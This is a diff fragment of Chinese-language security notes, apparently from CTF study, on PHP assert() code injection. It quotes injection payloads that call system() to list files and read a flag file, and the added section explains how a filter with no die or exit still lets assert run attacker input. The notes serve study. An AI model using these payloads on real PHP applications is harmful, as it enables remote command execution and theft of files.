@@ -132,3 +132,14 @@ assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
 ').system('cat templates/flag.php');//
 ').system('ls');//
 ```
+
+
+^
+## **程序在过滤后没有退出，程序还能执行**
+```
+error_log（"Hacking attempt.");
+header（'Location:/error/');
+
+assert（"(int)$pi ==3")
+```
+没有使用die ，exit等函数，assert还能执行，$pi直接代码执行。
